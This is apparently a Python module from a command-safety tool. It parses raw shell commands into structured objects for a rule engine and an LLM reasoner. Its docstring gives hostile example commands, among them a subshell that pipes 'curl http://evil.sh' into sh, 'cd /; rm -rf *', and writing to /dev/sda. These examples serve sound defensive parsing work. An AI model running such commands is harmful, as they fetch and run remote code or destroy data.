"""
Command Parser — Owner: Harshit
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Converts a raw shell command string into a structured ParsedCommand
that the rule engine and LLM reasoner can work with.

Handles:
  - Basic commands: rm -rf /tmp/foo
  - Pipes:          cat file.txt | grep error | rm ...
  - Semicolons:     cd /; rm -rf *
  - Logical AND:    rm foo && echo done
  - Logical OR:     ls /foo || echo missing   (NOT treated as pipe)
  - Subshells:      $(curl http://evil.sh | sh)
  - Heredocs:       cat << EOF > /etc/hosts
  - Sudo:           sudo rm -rf /important
  - Redirections:   echo "" > /dev/sda
  - Glob patterns:  rm -rf /var/log/*
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from typing import Optional, TYPE_CHECKING

if TYPE_CHECKING:
    from engine.parser.alias_resolver import AliasResolver


@dataclass
class ParsedCommand:
    """
    Structured representation of a shell command after parsing.
    This is the object consumed by both the Rule Engine and LLM Reasoner.
    """
    raw: str                                # Original unmodified command string
    tokens: list[str]                       # shlex-tokenized tokens
    base_command: str                       # Primary executable (e.g. "rm")
    flags: list[str]                        # Flags/options (e.g. ["-r", "-f"])
    arguments: list[str]                    # Positional arguments (paths, etc.)
    is_sudo: bool                           # True if command uses sudo/su
    has_pipe: bool                          # True if command contains pipes
    has_redirect: bool                      # True if command has > >> redirections
    has_subshell: bool                      # True if command contains $() or ``
    pipe_segments: list["ParsedCommand"]    # Each segment of a piped command
    chain_segments: list["ParsedCommand"]   # Segments from ; && || splitting
    target_paths: list[str]                 # Resolved target filesystem paths
    cwd: str                                # Working directory context
    user: str                               # Executing user
    is_glob: bool = False                   # True if arguments contain wildcards
    glob_patterns: list[str] = field(default_factory=list)
    chain_operator: str = ""                # "|", ";", "&&", "||" — how this was joined
    is_dry_run: bool = False                # True if --dry-run / -n / --no-act present


_DRY_RUN_FLAGS = {"--dry-run", "-n", "--no-act", "--simulate", "--check"}
_SUDO_CMDS = {"sudo", "su", "doas", "pkexec"}
_REDIRECT_RE = re.compile(r"(?:>>?|<<?)(?:\s*\S+)?")
_SUBSHELL_RE = re.compile(r"\$\(.*?\)|\`.*?\`", re.DOTALL)
_GLOB_RE = re.compile(r"[*?\[\]]")


class CommandParser:
    """
    Parses a raw shell command string into a ParsedCommand.

    Precedence of splitting (highest to lowest, matching shell semantics):
      1. Semicolons (;) and logical operators (&& ||) — chain operators
      2. Pipes (|) within each chain segment
      3. Individual token analysis

    Usage:
        parser = CommandParser(alias_resolver=resolver)
        parsed = parser.parse("sudo rm -rf /var/log/*", cwd="/home/user", user="harshit")
    """

    def __init__(self, alias_resolver: Optional["AliasResolver"] = None) -> None:
        self._alias_resolver = alias_resolver

    def parse(self, command: str, cwd: str = "", user: str = "") -> ParsedCommand:
        """
        Parse a raw command string into a ParsedCommand.

        For chained commands (;, &&, ||) the root ParsedCommand represents
        the first segment, with all segments in chain_segments.

        For piped commands each segment is in pipe_segments.
        """
        raw = command.strip()
        if not raw:
            return self._empty(raw, cwd, user)

        # ── Step 1: Split on ; && || (shell chain operators) ─────────────────
        chain_parts = self._split_chain(raw)
        if len(chain_parts) > 1:
            chain_segs = []
            for part_cmd, part_op in chain_parts:
                seg = self._parse_pipe_or_single(part_cmd, cwd, user)
                seg.chain_operator = part_op
                chain_segs.append(seg)
            root = chain_segs[0]
            root.raw = raw          # ← always the full original command
            root.chain_segments = chain_segs
            return root

        # ── Step 2: Single (possibly piped) command ───────────────────────────
        return self._parse_pipe_or_single(raw, cwd, user)

    def _parse_pipe_or_single(self, command: str, cwd: str, user: str) -> ParsedCommand:
        """Handle pipe splitting for a single chain segment."""
        raw = command.strip()
        segments_raw = self._split_pipes(raw)
        if len(segments_raw) > 1:
            pipe_segments = [self._parse_single(s, cwd, user) for s in segments_raw]
            root = pipe_segments[0]
            root.has_pipe = True
            root.pipe_segments = pipe_segments
            return root
        return self._parse_single(raw, cwd, user)

    def _parse_single(self, command: str, cwd: str, user: str) -> ParsedCommand:
        """Parse a single, non-piped, non-chained command segment."""
        raw = command.strip()
        
        # Resolve alias if configured
        if self._alias_resolver:
            raw = self._alias_resolver.resolve(raw)
            
        tokens = self._safe_tokenize(raw)

        if not tokens:
            return self._empty(raw, cwd, user)

        # Detect and strip sudo
        # Flags that consume the NEXT token as their argument:
        _SUDO_ARG_FLAGS = {
            "-u", "--user", "-g", "--group", "-p", "--prompt",
            "-c", "--login-class", "-D", "--chdir",
            "-T", "--command-timeout", "-R", "--chroot",
            "-h", "--host",
        }
        is_sudo = tokens[0] in _SUDO_CMDS
        effective_tokens = tokens
        if is_sudo and len(tokens) > 1:
            skip = 1
            sudo_opts_with_arg = {"-u", "--user", "-g", "--group", "-p", "--prompt", "-U", "--other-user", "-C", "--close-from"}
            while skip < len(tokens):
                tok = tokens[skip]
                if tok in sudo_opts_with_arg:
                    skip += 2
                elif tok.startswith("-"):
                    skip += 1
                else:
                    break
            effective_tokens = tokens[skip:]

        base_command = effective_tokens[0] if effective_tokens else ""
        rest = effective_tokens[1:]
        flags = [t for t in rest if t.startswith("-")]
        arguments = [t for t in rest if not t.startswith("-")]
        glob_patterns = [a for a in arguments if _GLOB_RE.search(a)]
        is_dry_run = any(f in _DRY_RUN_FLAGS for f in flags)

        return ParsedCommand(
            raw=raw,
            tokens=tokens,
            base_command=base_command,
            flags=flags,
            arguments=arguments,
            is_sudo=is_sudo,
            has_pipe=False,
            has_redirect=bool(_REDIRECT_RE.search(raw)),
            has_subshell=bool(_SUBSHELL_RE.search(raw)),
            pipe_segments=[],
            chain_segments=[],
            target_paths=arguments,
            cwd=cwd,
            user=user,
            is_glob=bool(glob_patterns),
            glob_patterns=glob_patterns,
            is_dry_run=is_dry_run,
        )

    def _empty(self, raw: str, cwd: str, user: str) -> ParsedCommand:
        return ParsedCommand(
            raw=raw, tokens=[], base_command="", flags=[], arguments=[],
            is_sudo=False, has_pipe=False, has_redirect=False,
            has_subshell=False, pipe_segments=[], chain_segments=[],
            target_paths=[], cwd=cwd, user=user,
        )

    # ── Splitting helpers ──────────────────────────────────────────────────────

    def _split_chain(self, command: str) -> list[tuple[str, str]]:
        """
        Split on ; && || (chain operators), respecting quotes, subshells, pipes.

        Returns list of (segment_str, operator_that_PRECEDED_it).
        First segment's operator is "".

        Example:
            "cd /; rm -rf *"  → [("cd /", ""), ("rm -rf *", ";")]
            "ls && rm foo"    → [("ls", ""), ("rm foo", "&&")]
        """
        parts: list[tuple[str, str]] = []
        current: list[str] = []
        depth = 0
        in_sq = False
        in_dq = False
        i = 0
        pending_op = ""

        while i < len(command):
            ch = command[i]

            if ch == "'" and not in_dq:
                in_sq = not in_sq
            elif ch == '"' and not in_sq:
                in_dq = not in_dq
            elif not in_sq and not in_dq:
                if ch in ("(", "{"):
                    depth += 1
                elif ch in (")", "}"):
                    depth -= 1
                elif depth == 0:
                    # Check for && or ||
                    if i + 1 < len(command) and command[i:i+2] in ("&&", "||"):
                        op = command[i:i+2]
                        seg = "".join(current).strip()
                        if seg:
                            parts.append((seg, pending_op))
                        pending_op = op
                        current = []
                        i += 2
                        continue
                    # Check for ; (but not ;;)
                    elif ch == ";" and not (i + 1 < len(command) and command[i+1] == ";"):
                        seg = "".join(current).strip()
                        if seg:
                            parts.append((seg, pending_op))
                        pending_op = ";"
                        current = []
                        i += 1
                        continue

            current.append(ch)
            i += 1

        seg = "".join(current).strip()
        if seg:
            parts.append((seg, pending_op))

        # Only return multiple if genuinely split
        return parts if len(parts) > 1 else [(command, "")]

    def _split_pipes(self, command: str) -> list[str]:
        """
        Split on | respecting quotes and subshells.
        Does NOT split on ||.
        """
        segments: list[str] = []
        current: list[str] = []
        depth = 0
        in_sq = False
        in_dq = False
        i = 0

        while i < len(command):
            ch = command[i]
            if ch == "'" and not in_dq:
                in_sq = not in_sq
            elif ch == '"' and not in_sq:
                in_dq = not in_dq
            elif not in_sq and not in_dq:
                if ch in ("(", "{"):
                    depth += 1
                elif ch in (")", "}"):
                    depth -= 1
                elif ch == "|" and depth == 0:
                    # Don't split on ||
                    if i + 1 < len(command) and command[i + 1] == "|":
                        current.append("||")
                        i += 2
                        continue
                    segments.append("".join(current).strip())
                    current = []
                    i += 1
                    continue
            current.append(ch)
            i += 1

        if current:
            segments.append("".join(current).strip())

        return [s for s in segments if s]

    @staticmethod
    def _safe_tokenize(command: str) -> list[str]:
        """shlex tokenization with graceful fallback for syntax errors."""
        try:
            return shlex.split(command)
        except ValueError:
            return command.split()
